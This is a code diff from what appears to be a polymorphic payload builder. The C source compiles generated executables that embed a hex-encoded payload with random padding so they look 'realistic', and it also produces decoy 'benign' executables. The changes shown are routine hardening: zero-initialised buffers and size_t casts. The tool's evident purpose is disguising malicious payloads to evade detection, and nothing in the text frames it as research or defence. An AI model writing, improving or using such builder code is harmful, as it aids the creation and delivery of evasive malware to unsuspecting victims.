@@ -67,8 +67,8 @@ enum DeliveryType {
 
 // VS2022 Auto-Compiler for Windows - Fixed Runtime Library Issues
 static int VS2022_AutoCompile(const char* sourceFile, const char* outputFile) {
-    char compileCmd[4096];
-    char testCmd[1024];
+    char compileCmd[4096] = {0};
+    char testCmd[1024] = {0};
     int result = -1;
     
     // First, try to find VS2022 installation
@@ -487,7 +487,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
     
     if (payloadData && payloadSize > 0) {
         // Add padding to make executable larger and more realistic
-        size_t paddingSize = 4096 + (rand() % 8192); // 4-12KB additional padding
+        size_t paddingSize = 4096U + ((size_t)rand() % 8192U); // 4-12KB additional padding
         size_t totalDataSize = payloadSize + paddingSize;
         size_t arraySize = (totalDataSize * 6) + 2048; // Space for hex formatting + headers
         
@@ -503,7 +503,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
             
             // Add actual payload first
             for (size_t i = 0; i < payloadSize; i++) {
-                char hexByte[8];
+                char hexByte[8] = {0};
                 sprintf_s(hexByte, sizeof(hexByte), "0x%02X", (unsigned char)payloadData[i]);
                 strcat_s(payloadByteArray, arraySize, hexByte);
                 strcat_s(payloadByteArray, arraySize, ",");
@@ -516,7 +516,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
             
             // Add realistic padding data
             for (size_t i = 0; i < paddingSize; i++) {
-                char hexByte[8];
+                char hexByte[8] = {0};
                 unsigned char paddingByte = (unsigned char)(rand() % 256);
                 sprintf_s(hexByte, sizeof(hexByte), "0x%02X", paddingByte);
                 strcat_s(payloadByteArray, arraySize, hexByte);
@@ -534,8 +534,8 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
         }
     } else {
         // Generate large dummy data for benign executables to make them realistic size
-        size_t dummySize = 8192 + (rand() % 16384); // 8-24KB dummy data
-        size_t arraySize = (dummySize * 6) + 2048;
+        size_t dummySize = 8192U + ((size_t)rand() % 16384U); // 8-24KB dummy data
+        size_t arraySize = (dummySize * 6U) + 2048U;
         
         payloadByteArray = (char*)malloc(arraySize);
         if (payloadByteArray) {
@@ -547,7 +547,7 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
                 dummySize);
             
             for (size_t i = 0; i < dummySize; i++) {
-                char hexByte[8];
+                char hexByte[8] = {0};
                 unsigned char dummyByte = (unsigned char)(rand() % 256);
                 sprintf_s(hexByte, sizeof(hexByte), "0x%02X", dummyByte);
                 strcat_s(payloadByteArray, arraySize, hexByte);
